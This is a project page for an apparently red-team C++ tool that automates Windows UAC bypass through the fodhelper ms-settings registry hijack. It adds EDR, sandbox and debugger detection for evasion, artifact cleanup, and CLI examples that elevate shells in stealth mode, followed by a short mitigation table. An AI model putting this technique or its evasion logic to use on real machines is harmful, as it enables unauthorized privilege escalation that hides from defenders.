---
layout: page
title: "UAC Apex Framework (AEF) v4.0"
subtitle: "Enterprise-Grade Adaptive UAC Elevation Framework for Windows Red Team Operations"
permalink: /tools/my-repo/uac-apex/
category: my-repo
tags: [uac-bypass, windows, LPE, privilege-escalation, red-team, C++, CMake]
status: release
version: "4.0.0"
github_repo: "https://github.com/vulnquest58/uac-apex-framework"
language: "C++17"
platform: Windows
date: 2026-06-28
---

<div class="tool-hero" style="background: linear-gradient(135deg, rgba(59,130,246,0.12) 0%, rgba(124,58,237,0.08) 100%); border: 1px solid rgba(59,130,246,0.3); border-radius: 16px; padding: 2rem; margin-bottom: 2rem;">
  <div style="display:flex; align-items:center; gap:1rem; margin-bottom:1rem;">
    <span style="font-size:3rem;">🛡️</span>
    <div>
      <h1 style="margin:0; font-size:1.8rem; color:var(--text-primary);">UAC Apex Framework</h1>
      <p style="margin:0; color:var(--accent-primary); font-family: var(--font-mono); font-size:0.9rem;">AEF v4.0 · C++17 · Windows 10/11 · CMake 3.20+</p>
    </div>
  </div>
  <p style="margin:0 0 1rem; color:var(--text-secondary); font-size:0.95rem;">
    Enterprise-grade Adaptive Elevation Framework — context-aware UAC bypass orchestration with pre-flight risk scoring, retry/fallback logic, EDR detection, and automated artifact cleanup.
  </p>
  <div style="display:flex; gap:0.75rem; flex-wrap:wrap;">
    <a href="https://github.com/vulnquest58/uac-apex-framework" target="_blank" class="btn btn-primary" style="text-decoration:none; font-size:0.9rem;">
      <i class="fab fa-github"></i> GitHub Repository
    </a>
    <span style="background:rgba(59,130,246,0.15);color:#93c5fd;border:1px solid rgba(59,130,246,0.35);padding:6px 14px;border-radius:6px;font-size:0.85rem;font-family:var(--font-mono);">C++17</span>
    <span style="background:rgba(15,160,70,0.12);color:#4ade80;border:1px solid rgba(15,160,70,0.3);padding:6px 14px;border-radius:6px;font-size:0.85rem;">v4.0.0</span>
    <span style="background:rgba(234,179,8,0.12);color:#fbbf24;border:1px solid rgba(234,179,8,0.3);padding:6px 14px;border-radius:6px;font-size:0.85rem;">Windows Only</span>
  </div>
</div>

---

## Overview

**UAC Apex Framework (AEF)** is a modular, enterprise-grade UAC bypass orchestration engine written in C++17. It provides:

- **Context-aware technique selection** — automatically scores and ranks bypass methods based on the live environment
- **Pre-flight risk assessment** — detects EDR, sandboxes, debuggers, and UAC level before executing
- **Resilient execution** — retry with exponential backoff, fallback chains, and emergency shutdown
- **Clean architecture** — interfaces, registries, and dependency injection for easy extension

---

## Architecture

```
main() [CLI]
  └── ExecutionOrchestrator
        ├── PreFlightAnalysis
        │     ├── EnvironmentAwarenessModule  ← OS, UAC, EDR, VM, Sandbox, Debugger
        │     └── RiskAssessmentFramework     ← Weighted detection/execution/evasion score
        ├── DecisionEngine                    ← Technique scoring and ranking
        │     └── TechniqueRegistry → IElevationTechnique[]
        ├── ExecutionPhase                    ← Retry + fallback
        ├── ObservationPhase                  ← Telemetry anomaly detection
        └── CleanupPhase                      ← Artifact removal
```

---

## Project Structure

```
uac-apex-framework/
├── CMakeLists.txt
├── include/
│   ├── core/
│   │   ├── execution_orchestrator.h     # Lifecycle + exception hierarchy
│   │   ├── decision_engine.h            # AdaptiveDecisionEngine
│   │   ├── environment_module.h         # WindowsEnvironmentModule
│   │   └── risk_assessment.h            # DefaultRiskAssessor
│   └── techniques/
│       ├── technique_interface.h        # IElevationTechnique + TechniqueRegistry
│       └── fodhelper.h                  # ms-settings registry hijack
├── src/
│   ├── main.cpp                         # CLI entry point
│   ├── core/
│   │   ├── execution_orchestrator.cpp
│   │   ├── decision_engine.cpp
│   │   ├── environment_module.cpp
│   │   └── risk_assessment.cpp
│   └── techniques/
│       └── fodhelper.cpp
└── tests/
    └── test_orchestrator.cpp            # GoogleTest + GoogleMock
```

---

## Core Components

### ExecutionOrchestrator

The central lifecycle manager — coordinates all phases: pre-flight → execution → observation → cleanup.

| Feature | Detail |
|---------|--------|
| Retry logic | Configurable max retries with exponential backoff |
| Fallback | Degrades to `SAFE_MODE` when all techniques fail |
| Emergency shutdown | Wipes all artifacts on critical exception |
| Thread-safe | Execution runs in dedicated thread with timeout |

### EnvironmentAwarenessModule

Detects the live execution environment before any bypass is attempted.

| Detection | Method |
|-----------|--------|
| UAC status + level | Registry `ConsentPromptBehaviorAdmin` |
| Admin / System token | `CheckTokenMembership`, integrity level |
| EDR presence | Process snapshot against known EDR process list |
| AMSI | `LoadLibrary("amsi.dll")` + `AmsiInitialize` probe |
| VM detection | VMware/VBox files + processes |
| Sandbox detection | Disk size heuristic + sandbox directories |
| Debugger detection | PEB `BeingDebugged` + `IsDebuggerPresent` + process list |

### RiskAssessmentFramework

Weighted score across three risk dimensions:

| Dimension | Weight | Factors |
|-----------|--------|---------|
| Detection risk | 40% | EDR, AV, AMSI, monitoring level |
| Execution risk | 35% | UAC level, token privileges, stealth mode |
| Evasion risk | 25% | Debugger, sandbox, VM indicators |

Score **< 70** = proceed · Score **≥ 70** = abort

### DecisionEngine

`AdaptiveDecisionEngine` scores each registered technique:

```
score = (reliability × 40) + (stealth × 35)
      + preferred_bonus (if in preferred list)
      - EDR_penalty (if EDR detected)
      - monitoring_penalty (if highly monitored)
```

---

## Implemented Techniques

### `fodhelper` — ms-settings Registry Hijack

| Property | Value |
|----------|-------|
| **Method** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` |
| **Target** | `fodhelper.exe` (Feature On-Demand Helper) |
| **Works on** | Windows 10 build ≥ 10240, Windows 11 |
| **Requirements** | Medium integrity, UAC enabled, not already elevated |
| **Stealth score** | 65/100 |
| **Reliability** | 75/100 |
| **Cleanup** | Full registry tree deletion after execution |

```cpp
// Execution flow
write_payload(cmd)       // HKCU ms-settings default + DelegateExecute
launch_fodhelper()       // CreateProcess(fodhelper.exe, SW_HIDE)
Sleep(1500)              // Wait for elevated spawn
delete_payload()         // RegDeleteTree + parent key cleanup
```

---

## Build Instructions

```powershell
# Clone
git clone https://github.com/vulnquest58/uac-apex-framework.git
cd uac-apex-framework

# Configure (Release)
cmake -B build -G "Visual Studio 17 2022" -A x64 -DCMAKE_BUILD_TYPE=Release

# Build
cmake --build build --config Release
# Output: build\Release\aef.exe

# Build with tests
cmake -B build -DBUILD_TESTS=ON
cmake --build build --config Debug
ctest --test-dir build -C Debug -V
```

**Requirements:** Visual Studio 2022 (C++ workload), CMake ≥ 3.20, Windows SDK 10.0+

---

## CLI Usage

```powershell
# Elevate cmd.exe
.\aef.exe cmd.exe

# Dry-run: analysis only
.\aef.exe --dry-run powershell.exe

# Stealth mode + cleanup + preferred technique
.\aef.exe -t fodhelper -s -c cmd.exe /k whoami

# Custom timeout and retries
.\aef.exe -T 15000 -r 5 cmd.exe

# Block a technique
.\aef.exe -x fodhelper powershell.exe
```

| Flag | Description |
|------|-------------|
| `-t <name>` | Preferred technique |
| `-x <name>` | Block technique |
| `-s` | Stealth mode (reduces logging + noise) |
| `-c` | Cleanup artifacts after execution |
| `-r <n>` | Max retries (default: 3) |
| `-T <ms>` | Timeout per attempt (default: 30000) |
| `--dry-run` | Pre-flight analysis only — no execution |

---

## Adding a New Technique

```cpp
// 1. Inherit IElevationTechnique
class CmstpTechnique : public IElevationTechnique {
public:
    bool can_execute(const ExecutionContext& ctx) const override;
    ExecutionResult execute(const ExecutionContext& ctx) override;
    void cleanup() override;
    std::string name()              const override { return "cmstp"; }
    std::string version()           const override { return "1.0.0"; }
    std::string description()       const override { return "INF file via cmstp.exe"; }
    int stealth_score()             const override { return 55; }
    int reliability_score()         const override { return 70; }
    std::vector<std::string> requirements() const override {
        return { "Windows 10+", "cmstp.exe present" };
    }
};

// 2. Register before execution
TechniqueRegistry::instance().register_technique(
    std::make_unique<CmstpTechnique>());
```

---

## Mitigation

| Attack Vector | Recommended Defense |
|---------------|---------------------|
| ms-settings class hijack | Block `HKCU\Software\Classes` via AppLocker / WDAC |
| fodhelper auto-elevation | UAC set to "Always notify" (level 5) |
| Registry-based COM extension | Monitor HKCU class writes via Sysmon Event ID 13 |
| Unexpected process lineage | Detect `fodhelper` → arbitrary child processes in EDR |

---

## References

- [UACME — Comprehensive UAC bypass collection](https://github.com/hfiref0x/UACME)
- [LOLBAS — fodhelper](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Windows Internals — Token & UAC](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)

---

<div style="margin-top:1.5rem;">
  <a href="https://github.com/vulnquest58/uac-apex-framework" target="_blank" class="btn btn-primary" style="text-decoration:none; font-size:0.9rem;"><i class="fab fa-github"></i> GitHub Repository</a>
</div>
